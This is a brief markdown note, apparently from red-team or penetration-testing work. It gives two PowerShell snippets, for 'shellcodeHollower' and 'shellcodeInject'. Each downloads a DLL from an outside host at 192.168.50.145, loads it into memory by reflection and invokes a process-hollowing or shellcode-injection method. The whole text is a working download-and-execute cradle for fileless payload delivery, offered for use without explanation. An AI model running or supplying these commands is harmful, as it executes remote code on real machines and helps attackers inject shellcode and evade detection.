# Load shellcodeHollower remotely:

```powershell
$data = (New-Object System.Net.WebClient).DownloadData('http://192.168.50.145/run.dll')
$assem = [System.Reflection.Assembly]::Load($data)
$class = $assem.GetType("ProcessHollowingDLL.ProcessHollowing")  # Adjust the type name accordingly
$method = $class.GetMethod("PerformProcessHollowing")  # Ensure method name matches
$method.Invoke($null, $null)
```

# Load shellcodeInject remotely:

```powershell
$data = (New-Object System.Net.WebClient).DownloadData('http://192.168.50.145/run.dll')
$assem = [System.Reflection.Assembly]::Load($data)
$class = $assem.GetType("Inject.Injector")
$method = $class.GetMethod("InjectShellcode")
$method.Invoke($null, $null)
```
